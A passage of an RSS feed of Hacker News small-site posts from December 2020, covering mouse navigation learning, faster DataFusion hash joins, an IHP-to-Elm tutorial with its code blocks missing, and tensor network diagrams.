
    </div>
    

  
  <div>
    <div>
      <main role="main">
        <a id="main-content" tabindex="-1"></a>            <div>
    <div id="block-ucl-content">
  
    
      
<div role="article"> 
  <div>     

    <div>
      <div>
        <div>
          
      
  
                      <div>
              <div><div>
  
    
      
      <div>
          <div>
    <div><p>Even the most advanced feats of human intelligence initially depend on innate behaviours to catalyse learning.</p></div>
  </div>
    <div>
    <div><p>Released into a new environment, young mice immediately search for crevices to hide in, test out routes to safety, and inspect any objects that could obstruct their path. But what information do they extract from the environment while exploring it?</p></div>
  </div>
    <div>
    <div><p>Animals are commonly thought to learn by observing unfamiliar features in the environment and incorporating them into an abstract internal representation. We found, however, that mere observation did not improve their ability to navigate.</p></div>
  </div>

    </div>
  
          </div>
</div>

            </div>
                  </div>
        
        
      </div>
    </div>

  </div> 
  

</div> 
  </div>

  </div>

      </main>
    </div>
  </div>

  
  

</div>
  </div></div>]]>
            </description>
            <link>https://www.sainsburywellcome.org/web/blog/instinct-and-learning-two-sides-same-coin</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515511</guid>
            <pubDate>Wed, 23 Dec 2020 08:01:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making joins faster in DataFusion based on table statistics]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25515144">thread link</a>) | @hashjoiner
<br/>
December 22, 2020 | https://godatadriven.com/blog/making-joins-faster-in-datafusion-based-on-table-statistics/ | <a href="https://web.archive.org/web/*/https://godatadriven.com/blog/making-joins-faster-in-datafusion-based-on-table-statistics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

                        
            
            

            <!-- //category -->


            <p><a href="https://github.com/apache/arrow/tree/master/rust/datafusion" title="DataFusion">DataFusion</a> is a new data processing engine written in the Rust programming language. It provides a SQL and a DataFrame API to transform datasets from multiple sources and in multiple file formats, similar to Spark. DataFusion uses <a href="https://arrow.apache.org/" title="Apache Arrow">Apache Arrow</a> as the underlying memory model, an efficient in-memory columnar format. This choice has significant performance benefits compared to a row-level representation such as used by <a href="https://spark.apache.org/" title="Apache Spark">Apache Spark</a>.</p>
<p>As other databases &amp; engines have shown, performing analytical (<a href="https://en.wikipedia.org/wiki/Online_analytical_processing" title="OLAP">OLAP</a>) queries on a <a href="http://cidrdb.org/cidr2005/papers/P19.pdf" title="columnar rather than row-by-row format">columnar rather than row-by-row format</a> can significantly speed up query execution, often by 20x or more!  When processing is done row-by-row, a lot of complex operations are being executed in the inner loop when executing a query, such as interpreting an expression, computing the result and going to the next value in the row, dealing with completely different operations and data types. In contrast, when operating on a columnar level, the inner loop can be very simple, making it easy for the CPU to see what instructions will likely run next and utilize various forms of <a href="https://en.m.wikipedia.org/wiki/Instruction-level_parallelism" title="instruction level parallelism">instruction level parallelism</a>. Modern CPUs can run hundreds of instructions at the same time, even on one core. Code can be written to use available <a href="https://en.m.wikipedia.org/wiki/SIMD" title="SIMD">SIMD</a> instructions, operating at multiple inputs at the same time to speed up things even more.<img src="https://arrow.apache.org/img/simd.png" alt="Arrow Format" title="Arrow Format"></p>
<p><em>Image source: Arrow website</em></p>
<p>DataFusion is implemented in <a href="https://www.rust-lang.org/" title="Rust">Rust</a>, a language that is both fast and has control over memory while still providing memory safety, making it a very suitable language to write performant and correct code. Compared to Java running on the JVM, systems written in Rust tend to use much less memory. This saves costs and makes it possible to run bigger workloads on a single machine! An earlier benchmark of <a href="https://ballistacompute.org/" title="Ballista">Ballista</a>, a distributed engine in Rust utilizing DataFusion, <a href="https://andygrove.io/rust_bigdata_benchmarks/" title="shows">shows</a> that it can do with about 10x less memory on small to medium sized datasets. The JVM needs at least 1 GB for the heap. Spark also keeps intermediate results in memory between stages. DataFusion can stream more in batches of records, keeping memory usage low. DataFusion also benefits from Arrow format, which stores data types such as strings in an efficient way.</p>
<p>Numerous performance improvements have been added in the Rust version of Arrow and DataFusion between version 2 and 3 which is planned for release in January.<br>
For example, I have contributed a<a href="https://github.com/apache/arrow/pull/8781" title=" faster CSV parser"> faster CSV parser</a> and <a href="https://github.com/apache/arrow/pull/8863" title="improved">improved</a> the performance of <a href="https://github.com/apache/arrow/pull/8832" title="hashing">hashing</a>. Kernels have been improved that provide implementations of often-used calculations, such as <a href="https://github.com/apache/arrow/pull/8800" title="sum">sum</a>, filter, <a href="https://github.com/apache/arrow/pull/8803" title="taking multiple elements">taking multiple elements</a> of an array by index (also called indexing or gathering), and <a href="https://github.com/apache/arrow/pull/8837" title="more">more</a>. As DataFusion and Arrow are relatively new projects, there is still a lot of room for further improvement.</p>
<p>Recently, I <a href="https://github.com/apache/arrow/pull/8961" title="added a new optimization pass to">added a new optimization pass to</a> DataFusion to make hash joins faster. A hash join is a popular algorithm to implement joins in a fast way. The hash join algorithm is divided in a <em>build</em> stage and a <em>probe</em> stage. The <em>build</em> (or left side) stage creates a lookup table to map the keys in the join condition to a row index. The <em>probe</em> (right side) stage looks up the items in the lookup table by key and adds the matching rows to the end result if there is a match.<br>
It is faster to create a lookup table for the smallest table. This will avoid work for creating the lookup table for more rows, as well as not having the requirement to keep the bigger table in memory. For the optimization to be possible, we need to know the number of rows of both sources before executing the query. Luckily, for Parquet and in-memory tables this can be calculated based on the metadata. This information has been exposed recently in DataFusion.</p>
<h4 id="implementation-results">Implementation / Results</h4>
<p>The optimization is implemented as an optimization pass on the logical plan, an abstract representation of a query. When the left side of a join has more rows than the right side, the order and join type are swapped. If the left side already is smaller, the order is kept intact.<br>
While testing the optimization something unexpected happened: When the optimization rule was used to change the order, the query performed worse than the original.<br>
While studying the implementation of the hash join in DataFusion, it became clear that next to the left side of a join, the right part creates a lookup table as well!<br>
I <a href="https://github.com/apache/arrow/pull/8965" title="changed the implementation">changed the implementation</a> to only use the probe side to look up items on the left side and simplified the implementation, removing some other inefficiencies. Now queries having joins run much faster than before. This can be demonstrated on two <a href="http://www.tpc.org/tpch/" title="TCP-H">TCP-H</a> benchmark queries that include a join and are supported in DataFusion. Notably, TCP-H 5 is now 16x faster and TCP-H 12 more than 4 times faster.<br>
I ran the <a href="https://github.com/apache/arrow/tree/master/rust/benchmarks" title="TPC-H">TPC-H</a> benchmarks using the command: <code>cargo run  --release --bin tpch -- benchmark --iterations 10 --path <location> --format tbl --query 12 --batch-size 20000 --concurrency 10 -m </location></code> and averaged the results.</p>
<p><img src="https://godatadriven.com/wp-content/uploads/2020/12/improved_join-900x629.png" alt=""></p>
<p>When the optimization rule is applied and combined with the improved hash join implementation, it makes the queries where the rule can be applied run faster, in this case reducing the total execution time by about 16%. For more imbalanced joins, the speedup can be greater. The data contains roughly 6 million line items (originally on the left side of the join) and 1.5 million orders (on the right side).</p>
<p><img src="https://godatadriven.com/wp-content/uploads/2020/12/carbon-7-900x834.png" alt=""></p>
<p><img src="https://godatadriven.com/wp-content/uploads/2020/12/join_build_probe_order-900x542.png" alt=""></p>
<h4 id="conclusion">Conclusion</h4>
<p>Statistics are a promising way to accelerate queries. In the future, a lot more optimizations could be added that benefit from table statistics. Many statistics however are known only after queries run, so in the future it would be interesting to add a form of <a href="https://databricks.com/blog/2020/05/29/adaptive-query-execution-speeding-up-spark-sql-at-runtime.html" title="Adaptive Query Execution">Adaptive Query Execution</a> as well.<br>
Hash joins could be further improved, for example by using <a href="https://www.cockroachlabs.com/blog/vectorized-hash-joiner/" title="vectorized hashing">vectorized hashing</a>, which can also be used for hash aggregations which are used in GROUP BY queries.</p>
<p>I am personally very excited for what the future of Arrow and DataFusion brings and making Rust and Apache Arrow accelerate data analytics &amp; data science.</p>

            

        </article><section>
            <div>
                <div>
                    <h3>Subscribe to our newsletter</h3>
                    <p>Stay up to date on the latest insights and
                        best-practices by registering for the GoDataDriven newsletter.</p>
                </div>
                            </div>
        </section></div>]]>
            </description>
            <link>https://godatadriven.com/blog/making-joins-faster-in-datafusion-based-on-table-statistics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515144</guid>
            <pubDate>Wed, 23 Dec 2020 06:53:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell and Elm: How to initialize data from IHP directly to Elm]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25515037">thread link</a>) | @_query
<br/>
December 22, 2020 | https://driftercode.com/blog/passing-flags-from-ihp-to-elm | <a href="https://web.archive.org/web/*/https://driftercode.com/blog/passing-flags-from-ihp-to-elm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Generate types, encoders and decoders for Elm automatically in IHP.</p><article><p><em>This is <strong>part 2</strong> of the series <a target="_blank" rel="noreferrer noopener" href="https://driftercode.com/blog/ihp-with-elm-series">IHP with Elm</a></em></p><p>When initializing Elm, you can set initial values through something called <a target="_blank" rel="noreferrer noopener" href="https://guide.elm-lang.org/interop/flags.html">flags</a>.</p><p>For this part of the series, I want to show you a technique for loading these values called flags directly from IHP into Elm in a type-safe way.</p><p>And what's even cooler, we will also enable you to <strong>generate Haskell types to Elm</strong> without writing any decoders or encoders manually 😍</p><h2>Starting out simple</h2><p>IHP is a full-stack web framework, and Elm should as mentioned in the previous post not be used for absolutely everything view-related in an IHP app.</p><p><strong>In IHP, use Elm only when you start to think "I actually need Elm".</strong> That will keep the complexity down and let you use Elm for what it's great for.</p><p>All this being said, the examples in this tutorial are made extremely simple to make the process easier to follow.</p><h2>Continue from part one</h2><p>If you haven't done <a href="https://driftercode.com/blog/ihp-with-elm">part 1</a> of this series, do so first.</p><p><strong>If you don't want to</strong>, you could <a target="_blank" rel="noreferrer noopener" href="https://github.com/kodeFant/ihp-with-elm">clone the project source</a> and checkout to this tag to follow along:</p><code-editor language="bash"></code-editor><h2>Create an IHP database type</h2><p>To demonstrate how we can insert different datatypes into Elm, let's create a relatively complex database table.</p><p>Run the app with <code>npm start</code> and go to <a target="_blank" rel="noreferrer noopener" href="http://localhost:8001/Tables">localhost:8001/Tables</a>.</p><p>Select the <code>Code Edit</code> toggle in the top left corner and paste this snippet into the code area:</p><code-editor language="bash"></code-editor><p>Remember to press <code>Save</code> down in the bottom. It's a bit hidden, so easy to miss.</p><p><img src="https://driftercode.com/images/archive/ihp-with-elm/makeschemacode.gif" alt="Pasting in schema" loading="lazy"></p><p>After saving, press <code>Update DB</code> in the IHP dashboard. This should update the database with the new table.</p><p>This will have automatically created the type <code>Book</code>. Let's create a controller for it next.</p><h2>Generate Controller and Views</h2><p>Stay in the <code>localhost:8001</code> admin dashboard and select <code>Codegen</code> in the menu to the left.</p><p>Select <code>Controller</code>, name it <code>Books</code> and click <code>Preview</code> and click <code>Generate</code>.</p><p><strong>Like this:</strong></p><p><img src="https://driftercode.com/images/archive/ihp-with-elm/make-controller.gif" alt="Create Controller named Books" loading="lazy"></p><p>You will now have generated all you need to view, update, create and delete books. Pretty cool!</p><p>Just a couple of small adjustments before we proceeed:</p><p>Let's just use a checkbox field for the <code>hasRead</code> value and a datepicker for the <code>publishedAt</code> value.</p><p>In <strong>both</strong> <code>New.hs</code> and <code>Edit.hs</code> in the <code>/Web/View/Books/</code> folder, replace these two fields:</p><code-editor language="haskell"></code-editor><p>to</p><code-editor language="haskell"></code-editor><p>Let's also take a short visit to the Books Controller <code>/Web/Controller/Books.hs</code> and the buildBook function at the bottom. Make sure the nullable value <code>review</code> turns into <code>Nothing</code> if empty instead of <code>Just ""</code>.</p><code-editor language="haskell"></code-editor><p>Then go to <a target="_blank" rel="noreferrer noopener" href="http://localhost:8000/Books">http://localhost:8000/Books</a> to create just a couple of Books with some varying values.</p><h2>Some small changes in the hsx templates</h2><p>We are adding the Elm widget application globally because we are going to use it as a general purpose widget engine.</p><p>Navigate to <code>Web/View/Layout.hs</code> and add the elm script <code>&lt;script src="/elm/index.js"&gt;&lt;/script&gt;</code> to the scripts in development and remove the unused scripts for development as well.</p><code-editor language="hs"></code-editor><p>Note that we are using <strong>defer</strong> on prod.js and the elm script for Elm to load properly.</p><p>Secondly, let's replace what we wrote in the previous part of the series in <code>/Web/View/Static/Welcome.hs</code>, just to have a practical link to the Books.</p><code-editor language="hs"></code-editor><h2>Install haskell-to-elm</h2><p><code>haskell-to-elm</code> will let us generate Elm types from Haskell types, including encoders and decoders.</p><p>In order to generate Elm types from IHP, add the <code>haskell-to-elm</code> package to <strong>haskellDeps</strong> in <code>default.nix</code></p><code-editor language="nix"></code-editor><p>To update your local environment, close the server <strong>(ctrl+c)</strong> and run</p><code-editor language="bash"></code-editor><p>If you are on vscode, you might need to reload your text editor to catch the updates in .envrc.</p><p>Also add the required Elm packages required by <code>haskell-to-elm</code>. I i highly recommend the cli-tool <a target="_blank" rel="noreferrer noopener" href="https://github.com/zwilias/elm-json">elm-json</a> to install elm packages.</p><code-editor language="bash"></code-editor><h2>Reduce boilerplate for Haskell-to-Elm types</h2><p>Following these instructions will make it easier to add <code>haskell-to-elm</code> types later on.</p><p>Create a folder named <code>Application/Lib</code> and create a new Haskell module:</p><code-editor language="bash"></code-editor><p>Paste this code into <code>Application/Lib/DerivingViaElm.hs</code>.</p><code-editor language="haskell"></code-editor><p>You probably won't ever do any changes in this script, but it saves us from lots of boilerplate when creating <em>Haskell to Elm types</em>.</p><h2>Turn IHP types into JSON serializable types</h2><p>Create the file where the elm-compatible types will live.</p><code-editor language="bash"></code-editor><p>In <code>Web/JsonTypes.hs</code> we will create types that can be directly serialized into both JSON and Elm decoders. For starters, we will make a <code>BookJSON</code> type and a function for creating it from the IHP generated <code>Book</code>.</p><code-editor language="haskell"></code-editor><p>This is some extra work, but you also get to control what fields that will be exposed to the outside world here.</p><h2>Make a widget entry-point</h2><p>A logical place to write the entrypoints for this Elm widget is <code>Application/Helper/View.hs</code> as functions exposed here are accessible in all view modules.</p><p>We will also define a <code>Widget</code> type that will be like a register for all new widgets.</p><code-editor language="haskell"></code-editor><p><code>bookWidget</code> takes in the IHP <code>Book</code> type as an argument, converts to the <code>BookJSON</code> type and wraps it inside a <code>Widget</code>.</p><p>Now we need to jump to the <code>elm/index.js</code> file and pass in the <code>data-flags</code> attribute from the widget. While we are at it we are also enabling the possibility to have several elm widgets present at one single page.</p><code-editor language="tsx"></code-editor><p>The value passed into the <code>data-flags</code> attribute is serialized and ready to be sent right through JavaScript and directly into Elm.</p><p>Let's put this <code>bookWidget</code> into <code>/Web/View/Books/Show.hs</code>:</p><code-editor language="haskell"></code-editor><h2>Autogenerate types</h2><p>Now it's time for the fun stuff. We need to go back to <a target="_blank" rel="noreferrer noopener" href="http://localhost:8001/">localhost:8001</a> and generate a script and select <code>Codegen</code> in the left menu and then <code>Script</code>. Type <code>GenerateElmTypes</code>, select <code>Preview</code> and then <code>Generate</code>.</p><p><strong>Like this:</strong></p><p><img src="https://driftercode.com/images/archive/ihp-with-elm/generate-elm-script.gif" alt="Generate Elm Script" loading="lazy"></p><p>IHP will have created an boilerplate for an executable for you.</p><p>Fill in the export logic for generating Elm types in <code>/Application/Script/GenerateElmTypes.hs</code>:</p><code-editor language="haskell"></code-editor><p>Let's test it. Run:</p><code-editor language="bash"></code-editor><p>Voila! If everything has gone well so far, you should have a file named <code>elm/Api/Generated.elm</code>. Inspect it with great joy. You didn't need to write any of this manually in Elm.</p><p><strong>What a beauty!</strong></p><p><img src="https://driftercode.com/images/archive/ihp-with-elm/generated-code.gif" alt="Generated Elm types" loading="lazy"></p><p>Let's make a <code>npm run gen-types</code> script for it in <code>package.json</code> and we might as well run it at the <code>npm start</code> command to update it regularly.</p><code-editor language="json"></code-editor><h2>Write some Elm</h2><p>Let's finish up this tutorial by rewriting the <code>Main.elm</code> to decode the flags and use the Haskell model.</p><code-editor language="elm"></code-editor><p>Go to <a target="_blank" rel="noreferrer noopener" href="http://localhost:8000/Books">localhost:8000/Books</a> and press <code>Show</code> on any book you have created. You should see where Elm starts and begins with the <code>&lt;elm🌳&gt;</code> tag.</p><p><img src="https://driftercode.com/images/archive/ihp-with-elm/showbook.png" alt="A sample of the Elm component" loading="lazy"></p><p>The Elm logic is handling every type as it was defined in Haskell, from <code>Bool</code> to even <code>Maybe String</code>.</p><p>To get a complete overview of the changes, see the <a target="_blank" rel="noreferrer noopener" href="https://github.com/kodeFant/ihp-with-elm/compare/2-ihp-with-elm...3-pass-data-from-ihp-to-elm">diff compared what we did in the previous post</a></p><h2>Next up</h2><p>We have created only one widget, but in the next post we are adding another one.</p><p>We are also structuring the widgets into separate modules, inpired by <a target="_blank" rel="noreferrer noopener" href="https://github.com/rtfeldman/elm-spa-example">Richard Feldman's RealWorld SPA archtecture</a>, but a simpler version.</p><ul><li><a href="https://driftercode.com/blog/structure-elm-into-a-multi-widget-app-for-ihp">Read on to <strong>part 3</strong> to structure your widgets in a nice way</a></li></ul></article></div>]]>
            </description>
            <link>https://driftercode.com/blog/passing-flags-from-ihp-to-elm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515037</guid>
            <pubDate>Wed, 23 Dec 2020 06:31:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Matrices as Tensor Network Diagrams]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514883">thread link</a>) | @behnamoh
<br/>
December 22, 2020 | https://www.math3ma.com/blog/matrices-as-tensor-network-diagrams | <a href="https://web.archive.org/web/*/https://www.math3ma.com/blog/matrices-as-tensor-network-diagrams">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href=""><p>In the <a href="https://www.math3ma.com/blog/matrices-probability-graphs">previous post</a>, I described a simple way to think about matrices, namely as bipartite graphs. Today I'd like to share a different way to picture matrices—one which is used not only in mathematics, but also in physics, chemistry, and machine learning. Here's the basic idea. An $m\times n$ matrix $M$ with real entries represents a linear map from $\mathbb{R}^n\to\mathbb{R}^m$. Such a mapping can be pictured as a node with two edges. One edge represents the input space, the other edge represents the output space.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c18ee025347a27a32481_node.jpg" alt=""></p></figure><p>That's it!</p><p>We can accomplish much with this simple idea. But first, a few words about the picture: To specify an $m\times n$ matrix $M$, one must specify all $mn$ entries $M_{ij}$. The index $i$ ranges from 1 to $m$—the dimension of the output space—and the index $j$ ranges from 1 to $n$—the dimension of the input space. Said differently, $i$ indexes the number of rows of $M$ and $j$&nbsp;indexes the number of its columns. These indices can be included in the picture, if we like:</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cdaa5a8312b3a44ecb44278_Mij.jpg" alt=""></p></figure><p>This idea generalizes very easily. A matrix is a two-dimensional array of numbers, while an $n$-dimensional array of numbers is called a <strong>tensor of order $n$</strong> or an $n$-<strong>tensor</strong>. Like a matrix, an $n$-tensor can be &nbsp;represented by a node with one edge for each dimension.</p><p>A number, for example, can be thought of as a zero-dimensional array, i.e. a point. It is thus a 0-tensor, which can be drawn as a node with <em>zero</em> edges. Likewise, a vector can be thought of as a <em>one</em>-dimensional array of numbers and hence a 1-tensor. It's represented by a node with <em>one </em>edge. A matrix is a <em>two</em>-dimensional array and hence 2-tensor. It's represented by a node with <em>two</em> edges. A 3-tensor is a <em>three</em>-dimensional array and hence a node with <em>three</em> edges, and so on.</p><figure id="w-node-27a904484310-24b29fc4"><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd99a73f8ce4494ad86852e_arraychart.jpg" alt=""></p></figure><p>In this graphical notation, familiar things have nice pictures. For example...</p><h3><strong>Matrix multiplication is tensor contraction.</strong></h3><p>Multiplying two matrices corresponds to "glueing" their pictures together. This is called tensor <strong>contraction</strong>.</p><figure id="w-node-0b127d2e466c-24b29fc4"><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c1cae025346888a363e5_mult.jpg" alt=""></p></figure><p>In the picture above, the edges with matching indices $j$ were the ones that were contracted. This is consistent with the fact that two matrices can be multiplied only when their input/output dimensions match up. You'll also notice that the resulting picture has two free indices, $i$ and $k$, which indeed defines a matrix.</p><p><strong>‍</strong>By the way, a key feature of having these pictures is that we don't have to carry around indices. So let's not!</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c1e80208a6476b30f327_mult2.jpg" alt=""></p></figure><p>A quick check: A&nbsp;matrix was described as a <em>single </em>node with one edge for each vector space, yet the picture above has <em>two</em> nodes. We still want this to represent a <em>single</em> matrix.&nbsp;And I claim it does!&nbsp;There's a nice way to see this: simply smoosh the blue and green nodes together.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c27e03764fbf94b64409_mult3.jpg" alt=""></p></figure><p>This reminds me of rain trickling down a window: when two raindrops come into contact, they fuse into bigger droplet. That's matrix-matrix multiplication. A similar picture holds for matrix-vector multiplication:&nbsp;a matrix $M$&nbsp;multiplied by a vector $\mathbf{v}$ results in another vector $M\mathbf{v}$, which is a node with one free edge.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd99bab91c3d7662087429d_Mv.jpg" alt=""></p></figure><p>More generally, the product of two or more tensors is represented by a cluster of nodes and edges where the contractions occur along edges with matching indices.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd99bffc370fa3fc0756ede_TN.jpg" alt=""></p></figure><h3>‍<strong>Node shapes can represent different properties.</strong></h3><p>So far I've drawn all the nodes as circles. But this was just a choice. There is no official rule for which shape to use. That means we can be creative! For example, we might want to reserve a circle or other symmetric shape, like a square, for <em>symmetric</em> matrices only.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8be6091c3d7f6e5487d7e_notsym.jpg" alt=""></p></figure><p>Then the <em>transpose </em>of a matrix can be represented by reflecting its picture:</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8be69c3d075631a5fe753_tranpose.jpg" alt=""></p></figure><p>So the symmetry of a symmetric matrix is preserved in the diagram!</p><figure id="w-node-bef31dc22539-24b29fc4"><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8be5503764fd9b8b592a6_symmetric.jpg" alt=""></p></figure><p>I&nbsp;also like the idea of drawing isometric embeddings as triangles:</p><figure id="w-node-aa68c59a594a-24b29fc4"><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c13ae02534421aa30e9b_isometry1.jpg" alt=""></p></figure><p>An isometric embedding $U$&nbsp;is a linear map from a space $V$&nbsp;into a space $W$ of larger dimension that preserves the lengths of vectors.<strong> </strong>Such a map satisfies $U^\top U=\text{id}_V$ but $UU^\top \neq \text{id}_W$. In words, you can always embed the small space $V$ into a larger one, then project back onto $V$ without distorting the vectors in $V$. (Not unlike a <a href="https://en.wikipedia.org/wiki/Retract">retraction map</a> in topology.) But you certainly <em>can't</em> squish all of $W$ onto little $V$, then expect to undo the damage after including $V$ back into $W$. This large-versus-small feature is hinted at by the triangles. (The base of a triangle is larger than its tip!) And in general, as shown below, identity linear operators are drawn as straight lines:</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c1325dcff22ae46c5494_isometry.jpg" alt=""></p></figure><p>‍</p><h3><strong>Matrix factorizations have nice pictures, too.</strong></h3><p>With all this talk of matrix multiplication, i.e. matrix composition, let's not forget about matrix factorization, i.e. matrix <em>de</em>composition! Every matrix, for example, has a <a href="https://jeremykun.com/2016/04/18/singular-value-decomposition-part-1-perspectives-on-linear-algebra/">singular value decomposition</a>. This has a nice picture associated to it:</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cdc15cb6a203e5ca33a3fb1_SVD.jpg" alt=""></p></figure><p>Here, $U$&nbsp;and $V$&nbsp;are unitary matrices, and hence isometries, and hence triangles. The matrix $D$&nbsp;is a diagonal matrix, which I like to represent by a diamond. In short, matrix factorization is the decomposition of a single node into multiple nodes; matrix multiplication is the fusion of multiple nodes into a single node.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cdc300c04fb87fb1aeb9854_duo.jpg" alt=""></p></figure><p>The drawing above illustrates another feature of these diagrams:&nbsp;the spatial position of the nodes doesn't really matter. I could've drawn the yellow, blue, green, and pink nodes in horizontal line, or in a vertical line, or in a zig-zag, or however I wish. The only important thing is that the diagram has two free edges. The product of matrices is another matrix!</p><h3><strong>Messy proofs reduce to picture proofs.</strong></h3><p>There's more we could say about this graphical notation, but I'll wrap up with another noteworthy feature: proofs can become very simple! Take the trace, for example. The trace of a matrix has a simple picture. It's defined to be the sum along a common index:</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c42291c3d71260494990_trace.jpg" alt=""></p></figure><p>This string-with-a-bead has no free edges. It's a loop. This is consistent with the fact that the trace is a <em>number. </em>It's a 0-tensor so it has no free indices. Now here's a proof that the trace is invariant under cyclic permutations:</p><figure id="w-node-f919cf76bde4-24b29fc4"><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5cd8c56ef8ce44ea434b641b_proof.jpg" alt=""></p></figure><p>Just slide beads along a necklace. So clean!</p><h3><strong>What's in a name?</strong>‍</h3><p>The diagrams discussed in today's post, which have their origins in <a href="https://en.wikipedia.org/wiki/Penrose_graphical_notation">Penrose's graphical notation</a>, are called <strong>tensor network diagrams </strong>and/or, perhaps with some minor differences, <strong>string diagrams</strong>. The "and/or" depends on who you are<em>.</em> That is, the idea to visually represent a map-of-vector-spaces as a node-with-edges is used in the physics/machine learning communities, where they are called <em>tensor network diagrams, </em>and also in the category theory community, where they are called <em>string diagrams</em>. I think this is just a case of different fields using nearly identical notation for different purposes.</p><p>Category theorists use string diagrams to <em>prove</em> things. (The diagrams appear in my little booklet on <a href="https://arxiv.org/abs/1809.05923">applied category theory</a>, for instance.) What's more, string diagrams are used to represent most any kind of mapping—not just mappings between vector spaces. Said more formally, string diagrams might arise in a discussion of any <em>monoidal category</em>. For a gentle introduction to these categorical ideas, check out <a href="https://arxiv.org/abs/1803.05316">Seven Sketches</a> by Fong and Spivak as well as <a href="https://www.amazon.com/Picturing-Quantum-Processes-Diagrammatic-Reasoning/dp/110710422X">Picturing Quantum Processes </a>by Coecke and Kissinger.</p><p>Some physicists and machine learning researchers, on the other hand, use tensor networks to <em>compute</em> things. A typical situation may go something like this. You have a quantum system. You wish to find the main eigenvector of a special linear operator, called a <a href="https://en.wikipedia.org/wiki/Hamiltonian_(quantum_mechanics)">Hamiltonian.</a> This eigenvector lives in an absurdly large Hilbert space, so you want a technique to find this vector in a compressed kind of way. Enter: tensor networks. </p><p>And by "absurdly large," I&nbsp;do mean ABSURDLY large. If you have an Avogadro's number's worth of quantum particles, each of which can occupy just two states, then you need a vector space of dimension $2^{10^{23}}$. Now imagine having a linear operator on this space. That's a matrix with $2^{10^{23}}\times 2^{10^{23}}$ entries. That is <em>exponentially</em> more than the number of atoms in the observable universe. There are only $10^{80}$ of those! Good luck storing this on a computer. In summary, tensor networks help us deal with a large number of parameters in a principled, tractable way.</p><p>Tensor networks also have much overlap with <a href="https://arxiv.org/abs/1710.01437">graphical models</a>, automata, and more.&nbsp;One vein of current research is identifying and making good use of those overlaps. So there's a lot to explore here. A few places to start are Miles Stoudenmire's <a href="http://itensor.org/">iTensor library</a>, Roman Orus's <a href="https://arxiv.org/abs/1306.2164">A Practical Introduction to Tensor Networks</a>, Jacob Biamonte's and Ville Bergholm's <a href="https://arxiv.org/abs/1708.00006">Tensor Networks in a Nutshell</a>, and Google's <a href="https://github.com/google/TensorNetwork">TensorNetwork library</a>.</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5b527d2844acede360b8e7ae_hline.jpg" alt=""></p></figure><p>I’ve been working on a project (with some excellent researchers who first introduced me to the tensor network world) that uses these diagrams in a more computational/physics-y setting. For that reason, I tend to think of them as tensor network diagrams, rather than as string diagrams. </p><p>The project, which features a special kind of tensor network, has some really neat mathematics that I'm excited to share. It also uses the <a href="https://www.math3ma.com/blog/matrices-probability-graphs">matrices-as-graphs</a> idea discussed on the blog previously. I plan to blog about it <a href="https://www.math3ma.com/blog/modeling-sequences-with-quantum-states">later in the year.</a> </p><p>Stay tuned!</p><figure><p><img src="https://uploads-ssl.webflow.com/5b1d427ae0c922e912eda447/5b527d2844acede360b8e7ae_hline.jpg" alt=""></p></figure><p><strong>New! </strong>[Added October 20, 2019] You can see some of today's ideas <em>in action </em>in "<a href="https://arxiv.org/abs/1910.07425">Modeling Sequences with Quantum States</a>" (arXiv:1910.07425). There, we make frequent use of tensor network diagrams, especially in the description of a certain training algorithm. You can read more about this work with Miles Stoudenmire and John Terilla <a href="https://www.math3ma.com/blog/modeling-sequences-with-quantum-states">here on the blog.</a></p></div></div>]]>
            </description>
            <link>https://www.math3ma.com/blog/matrices-as-tensor-network-diagrams</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514883</guid>
            <pubDate>Wed, 23 Dec 2020 06:06:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: An application that checks on you every minute]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25514837">thread link</a>) | @tpkahlon
<br/>
December 22, 2020 | https://tpkahlon.github.io/javascript/49/ | <a href="https://web.archive.org/web/*/https://tpkahlon.github.io/javascript/49/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://tpkahlon.github.io/javascript/49/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25514837</guid>
